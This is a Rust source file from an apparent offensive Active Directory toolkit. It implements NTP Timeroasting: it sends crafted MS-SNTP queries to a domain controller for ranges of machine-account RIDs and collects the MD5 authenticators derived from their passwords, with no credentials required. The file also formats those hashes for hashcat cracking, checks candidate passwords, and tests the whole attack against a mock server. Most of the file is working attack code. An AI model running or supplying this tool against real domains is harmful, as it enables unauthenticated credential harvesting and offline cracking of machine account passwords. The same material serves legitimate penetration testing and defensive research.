//! NTP Timeroasting -- machine account password roast via MS-SNTP.
//!
//! Windows domain controllers act as NTP servers and sign NTP responses with
//! an MD5 authenticator keyed by the machine account password of the
//! *requesting* computer. An attacker can query the DC with any RID in the
//! key identifier field and receive `MD5(MD4(password) || NTP-response[:48])`
//! for that machine account -- no credentials required.
//!
//! Hash format (hashcat mode 31300 with --username):
//! `{rid}:$sntp-ms${hex(hash)}${hex(salt)}`

use anyhow::{Result, bail};
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::net::SocketAddr;
use std::time::{Duration, Instant};
use tokio::net::UdpSocket;
use tracing::{debug, info};

/// Static NTP query prefix (56 bytes) using the MD5 authenticator.
/// From the original timeroast.py: db0011e9 00000000 00010000 00000000
/// e1b8407d ebc7e506 00000000 00000000 00000000 00000000 00000000 00000000
/// e1b8428b ffbfcd0a. Append 4-byte RID (LE) and 16 zero bytes.
const NTP_PREFIX: [u8; 56] = [
    0xdb, 0x00, 0x11, 0xe9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xe1, 0xb8, 0x40, 0x7d, 0xeb, 0xc7, 0xe5, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xe1, 0xb8, 0x42, 0x8b, 0xff, 0xbf, 0xcd, 0x0a,
];

/// Default NTP queries per second (same as timeroast.py).
pub const DEFAULT_RATE: u32 = 180;
/// Default give-up time in seconds (same as timeroast.py).
pub const DEFAULT_GIVEUP_SECS: u64 = 24;

/// Key identifier flag that selects the *previous* machine password.
const OLD_PASSWORD_FLAG: u32 = 1 << 31;

// ===========================================================
// Configuration
// ===========================================================

/// Configuration for the NTP Timeroast attack.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimeroastConfig {
    /// Domain controller hostname or IP acting as NTP server
    pub dc_host: String,
    /// RIDs to query (machine account RIDs)
    pub rids: Vec<u32>,
    /// NTP queries per second
    pub rate: u32,
    /// Quit after this long without a response (RID space exhausted)
    pub giveup_time: Duration,
    /// Request hashes of the previous machine password instead of the current
    pub old_password: bool,
    /// UDP source port (0 = ephemeral; 123 can bypass strict firewalls)
    pub src_port: u16,
    /// NTP destination port (default 123)
    pub port: u16,
}

impl Default for TimeroastConfig {
    fn default() -> Self {
        Self {
            dc_host: String::new(),
            rids: Vec::new(),
            rate: DEFAULT_RATE,
            giveup_time: Duration::from_secs(DEFAULT_GIVEUP_SECS),
            old_password: false,
            src_port: 0,
            port: 123,
        }
    }
}

// ===========================================================
// Result Structures
// ===========================================================

/// A single roasted NTP hash.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TimeroastHash {
    /// RID of the machine account
    pub rid: u32,
    /// 16-byte MD5 authenticator (`MD5(MD4(password) || salt)`)
    pub hash: Vec<u8>,
    /// 48-byte NTP response data used as the salt
    pub salt: Vec<u8>,
}

impl TimeroastHash {
    /// Hashcat-mode-31300 compatible line: `{rid}:$sntp-ms${hex}${hex}`
    pub fn hashcat_line(&self) -> String {
        hashcat_format(self.rid, &self.hash, &self.salt)
    }
}

/// Result of a Timeroast run.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimeroastResult {
    /// Hashes received from the DC
    pub hashes: Vec<TimeroastHash>,
    /// Total queries sent
    pub queried: usize,
    /// Valid 68-byte responses received
    pub received: usize,
    /// Domain controller queried
    pub dc_host: String,
}

// ===========================================================
// Wire Format Helpers
// ===========================================================

/// Build a full 76-byte NTP query: prefix + RID (LE, XOR keyflag) + 16 zeros.
pub fn build_query(rid: u32, old_password: bool) -> Vec<u8> {
    let keyflag = if old_password { OLD_PASSWORD_FLAG } else { 0 };
    let mut query = Vec::with_capacity(76);
    query.extend_from_slice(&NTP_PREFIX);
    query.extend_from_slice(&(rid ^ keyflag).to_le_bytes());
    query.extend_from_slice(&[0u8; 16]);
    query
}

/// Parse a 68-byte NTP reply into (rid, hash, salt).
/// Reply layout: NTP data (48) + RID (4, LE, XOR keyflag) + MD5 (16).
pub fn parse_reply(reply: &[u8], old_password: bool) -> Option<TimeroastHash> {
    if reply.len() != 68 {
        return None;
    }
    let keyflag = if old_password { OLD_PASSWORD_FLAG } else { 0 };
    let rid = u32::from_le_bytes([reply[48], reply[49], reply[50], reply[51]]) ^ keyflag;
    let hash = reply[52..68].to_vec();
    let salt = reply[..48].to_vec();
    Some(TimeroastHash { rid, hash, salt })
}

/// Encode a hash in hashcat mode 31300 format with username prefix.
pub fn hashcat_format(rid: u32, hash: &[u8], salt: &[u8]) -> String {
    format!("{rid}:$sntp-ms${}${}", hex::encode(hash), hex::encode(salt))
}

/// Verify a candidate machine password against a roasted hash.
/// The attack hash is `MD5(MD4(password_utf16le) || salt)`.
pub fn verify_machine_password(hash: &[u8], salt: &[u8], password: &str) -> bool {
    use md5::{Digest, Md5};
    let nt_hash = overthrone_core::crypto::md4::ntlm_hash(password);
    let mut hasher = Md5::new();
    hasher.update(nt_hash);
    hasher.update(salt);
    let digest = hasher.finalize();
    digest.as_slice() == hash
}

/// Parse comma-separated RID ranges like "512-580,600-1400" into a flat list.
pub fn parse_rid_ranges(spec: &str) -> Result<Vec<u32>> {
    let mut rids = Vec::new();
    for part in spec.split(',') {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some((start, end)) = part.split_once('-') {
            let start: u32 = start.trim().parse().map_err(|_| {
                anyhow::anyhow!("invalid RID range start: {start:?} (expected u32)")
            })?;
            let end: u32 = end
                .trim()
                .parse()
                .map_err(|_| anyhow::anyhow!("invalid RID range end: {end:?} (expected u32)"))?;
            if start >= end || end >= (1 << 31) {
                bail!("invalid RID range: {start}-{end} (0 <= start < end < 2^31)");
            }
            rids.extend(start..=end);
        } else {
            let rid: u32 = part
                .parse()
                .map_err(|_| anyhow::anyhow!("invalid RID: {part:?} (expected u32)"))?;
            if rid >= (1 << 31) {
                bail!("invalid RID: {rid} (must be < 2^31)");
            }
            rids.push(rid);
        }
    }
    if rids.is_empty() {
        bail!("no RIDs specified");
    }
    Ok(rids)
}

// ===========================================================
// Main Attack
// ===========================================================

/// Run the NTP Timeroast attack against a DC.
///
/// Sends NTP queries at `rate` per second with an MD5 authenticator. Each
/// response for an existing machine account reveals its password hash. Stops
/// when no response has arrived for `giveup_time` (RID space exhausted) or
/// all RIDs have been queried and no further traffic arrives.
pub async fn run_timeroast(config: &TimeroastConfig) -> Result<TimeroastResult> {
    if config.dc_host.is_empty() {
        bail!("dc_host is required for timeroast");
    }
    if config.rate == 0 {
        bail!("rate must be > 0");
    }
    if config.giveup_time.is_zero() {
        bail!("giveup_time must be > 0");
    }
    info!(
        "Timeroast: querying {} for {} RIDs (rate={}/s, old_pwd={})",
        config.dc_host,
        config.rids.len(),
        config.rate,
        config.old_password
    );

    let bind_addr: SocketAddr = if config.src_port == 0 {
        "0.0.0.0:0".parse()?
    } else {
        format!("0.0.0.0:{}", config.src_port).parse()?
    };
    let socket = UdpSocket::bind(bind_addr).await?;
    let target = format!("{}:{}", config.dc_host, config.port);
    let query_interval = Duration::from_secs_f64(1.0 / f64::from(config.rate));

    let mut result = TimeroastResult {
        hashes: Vec::new(),
        queried: 0,
        received: 0,
        dc_host: config.dc_host.clone(),
    };
    let mut seen = HashSet::new();
    let mut rid_iter = config.rids.iter();
    let mut last_ok = Instant::now();
    let mut buf = [0u8; 120];

    while Instant::now().duration_since(last_ok) < config.giveup_time {
        // Send the next query, if any.
        if let Some(&rid) = rid_iter.next() {
            let query = build_query(rid, config.old_password);
            socket.send_to(&query, &target).await?;
            result.queried += 1;
        }

        // Wait for either a response or the next query slot.
        tokio::select! {
            _ = tokio::time::sleep(query_interval) => {}
            res = socket.recv_from(&mut buf) => {
                if let Ok((n, _src)) = res
                    && n == 68
                {
                    result.received += 1;
                    last_ok = Instant::now();
                    if let Some(hash) = parse_reply(&buf[..n], config.old_password)
                        && seen.insert(hash.rid)
                    {
                        debug!("Timeroast: RID {} responded", hash.rid);
                        result.hashes.push(hash);
                    }
                }
            }
        }
    }

    info!(
        "Timeroast: {} hashes from {} responses ({} queries)",
        result.hashes.len(),
        result.received,
        result.queried
    );
    Ok(result)
}

// ===========================================================
// Tests
// ===========================================================

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::Duration;

    #[test]
    fn test_default_config() {
        let c = TimeroastConfig::default();
        assert!(c.dc_host.is_empty());
        assert!(c.rids.is_empty());
        assert_eq!(c.rate, DEFAULT_RATE);
        assert_eq!(c.giveup_time, Duration::from_secs(DEFAULT_GIVEUP_SECS));
        assert!(!c.old_password);
        assert_eq!(c.src_port, 0);
        assert_eq!(c.port, 123);
    }

    #[test]
    fn test_config_serde_roundtrip() {
        let c = TimeroastConfig {
            dc_host: "dc01.corp.local".to_string(),
            rids: vec![512, 513, 1000],
            rate: 250,
            giveup_time: Duration::from_secs(10),
            old_password: true,
            src_port: 123,
            port: 123,
        };
        let json = serde_json::to_string(&c).unwrap();
        let back: TimeroastConfig = serde_json::from_str(&json).unwrap();
        assert_eq!(back.dc_host, "dc01.corp.local");
        assert_eq!(back.rids, vec![512, 513, 1000]);
        assert_eq!(back.rate, 250);
        assert_eq!(back.giveup_time, Duration::from_secs(10));
        assert!(back.old_password);
        assert_eq!(back.src_port, 123);
        assert_eq!(back.port, 123);
    }

    #[test]
    fn test_build_query_layout() {
        let q = build_query(512, false);
        assert_eq!(q.len(), 76);
        assert_eq!(&q[..56], &NTP_PREFIX);
        // RID at offset 56, little-endian
        assert_eq!(&q[56..60], &[0x00, 0x02, 0x00, 0x00]);
        // 16 zero bytes at the end
        assert_eq!(&q[60..], &[0u8; 16]);
    }

    #[test]
    fn test_build_query_old_password_flag() {
        let q = build_query(512, true);
        // RID XOR 0x80000000
        assert_eq!(&q[56..60], &[0x00, 0x02, 0x00, 0x80]);
    }

    #[test]
    fn test_parse_reply_layout() {
        let mut reply = vec![0u8; 68];
        reply[..48].copy_from_slice(&[0x11u8; 48]); // salt
        reply[48..52].copy_from_slice(&512u32.to_le_bytes());
        reply[52..68].copy_from_slice(&[0x22u8; 16]); // hash
        let h = parse_reply(&reply, false).unwrap();
        assert_eq!(h.rid, 512);
        assert_eq!(h.salt, vec![0x11u8; 48]);
        assert_eq!(h.hash, vec![0x22u8; 16]);
    }

    #[test]
    fn test_parse_reply_old_password_flag() {
        let mut reply = vec![0u8; 68];
        reply[48..52].copy_from_slice(&(512u32 ^ OLD_PASSWORD_FLAG).to_le_bytes());
        let h = parse_reply(&reply, true).unwrap();
        assert_eq!(h.rid, 512);
    }

    #[test]
    fn test_parse_reply_wrong_length() {
        assert!(parse_reply(&[0u8; 67], false).is_none());
        assert!(parse_reply(&[0u8; 69], false).is_none());
        assert!(parse_reply(&[], false).is_none());
    }

    #[test]
    fn test_hashcat_format() {
        let hash = [0xabu8; 16];
        let salt = [0xcdu8; 48];
        let line = hashcat_format(512, &hash, &salt);
        assert_eq!(
            line,
            format!("512:$sntp-ms${}${}", hex::encode(hash), hex::encode(salt))
        );
        assert!(line.starts_with("512:$sntp-ms$"));
    }

    #[test]
    fn test_verify_machine_password_known_vector() {
        // Hand-computed: MD5(MD4("password") || 48x0xcd)
        let salt = [0xcdu8; 48];
        let hash = {
            use md5::{Digest, Md5};
            let nt = overthrone_core::crypto::md4::ntlm_hash("password");
            let mut hasher = Md5::new();
            hasher.update(nt);
            hasher.update(salt);
            let d = hasher.finalize();
            d.to_vec()
        };
        assert!(verify_machine_password(&hash, &salt, "password"));
        assert!(!verify_machine_password(&hash, &salt, "Password1"));
    }

    #[test]
    fn test_parse_rid_ranges_basic() {
        assert_eq!(parse_rid_ranges("512").unwrap(), vec![512]);
        assert_eq!(parse_rid_ranges("512-514").unwrap(), vec![512, 513, 514]);
        assert_eq!(
            parse_rid_ranges("512-513,600").unwrap(),
            vec![512, 513, 600]
        );
        assert_eq!(
            parse_rid_ranges("512-513,600-601").unwrap(),
            vec![512, 513, 600, 601]
        );
    }

    #[test]
    fn test_parse_rid_ranges_rejects() {
        assert!(parse_rid_ranges("").is_err());
        assert!(parse_rid_ranges("512-512").is_err());
        assert!(parse_rid_ranges("600-512").is_err());
        assert!(parse_rid_ranges("2147483648").is_err());
        assert!(parse_rid_ranges("2147483648-2147483650").is_err());
        assert!(parse_rid_ranges("abc").is_err());
        assert!(parse_rid_ranges("512-").is_err());
    }

    #[tokio::test]
    async fn test_run_timeroast_mock_server() {
        // Mock DC: responds to a 76-byte NTP query with a 68-byte reply.
        let server = UdpSocket::bind("127.0.0.1:0").await.unwrap();
        let server_addr = server.local_addr().unwrap();
        let expected_rid = 512u32;
        let salt = [0x11u8; 48];
        let hash = [0x22u8; 16];
        let mut reply = Vec::with_capacity(68);
        reply.extend_from_slice(&salt);
        reply.extend_from_slice(&expected_rid.to_le_bytes());
        reply.extend_from_slice(&hash);

        let server_task = tokio::spawn(async move {
            let mut buf = [0u8; 120];
            let (n, src) = server.recv_from(&mut buf).await.unwrap();
            assert_eq!(n, 76, "query must be 76 bytes");
            assert_eq!(&buf[..56], &NTP_PREFIX);
            assert_eq!(
                u32::from_le_bytes([buf[56], buf[57], buf[58], buf[59]]),
                expected_rid
            );
            server.send_to(&reply, src).await.unwrap();
        });

        let config = TimeroastConfig {
            dc_host: server_addr.ip().to_string(),
            rids: vec![expected_rid],
            rate: 1000,
            giveup_time: Duration::from_millis(200),
            old_password: false,
            src_port: 0,
            port: server_addr.port(),
        };
        let result = run_timeroast(&config).await.unwrap();
        server_task.await.unwrap();

        assert_eq!(result.hashes.len(), 1);
        assert_eq!(result.hashes[0].rid, expected_rid);
        assert_eq!(result.hashes[0].hash, hash);
        assert_eq!(result.hashes[0].salt, salt);
        assert_eq!(
            result.hashes[0].hashcat_line().starts_with("512:$sntp-ms$"),
            true
        );
    }

    #[tokio::test]
    async fn test_run_timeroast_no_response() {
        // No server: loop must end after giveup_time with zero hashes.
        let config = TimeroastConfig {
            dc_host: "127.0.0.1".to_string(),
            rids: vec![512],
            rate: 1000,
            giveup_time: Duration::from_millis(100),
            old_password: false,
            src_port: 0,
            port: 9, // discard port: no listener
        };
        let result = run_timeroast(&config).await.unwrap();
        assert!(result.hashes.is_empty());
        // At least one query was sent
        assert!(result.queried >= 1);
    }

    #[tokio::test]
    async fn test_run_timeroast_validation() {
        let c = TimeroastConfig {
            dc_host: String::new(),
            ..Default::default()
        };
        assert!(run_timeroast(&c).await.is_err());
        let c = TimeroastConfig {
            dc_host: "127.0.0.1".to_string(),
            rate: 0,
            ..Default::default()
        };
        assert!(run_timeroast(&c).await.is_err());
        let c = TimeroastConfig {
            dc_host: "127.0.0.1".to_string(),
            giveup_time: Duration::ZERO,
            ..Default::default()
        };
        assert!(run_timeroast(&c).await.is_err());
    }
}
